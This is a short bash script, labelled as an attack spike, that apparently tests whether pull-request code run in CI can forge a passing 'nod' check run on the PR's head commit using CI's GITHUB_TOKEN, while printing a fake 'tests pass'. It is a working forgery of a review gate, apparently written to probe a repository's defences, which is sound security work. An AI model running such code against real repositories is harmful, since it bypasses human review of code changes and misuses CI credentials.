#!/usr/bin/env bash
# ATTACK (spike): PR code run by CI tries to forge the nod check with CI's GITHUB_TOKEN.
echo "tests pass"
sha="$(jq -r .pull_request.head.sha "$GITHUB_EVENT_PATH")"
gh api -X POST "repos/${GITHUB_REPOSITORY}/check-runs" -f name=nod -f head_sha="$sha" \
  -f status=completed -f conclusion=success -f 'output[title]=forged from CI' -f 'output[summary]=x' || true
echo "core change" >/dev/null
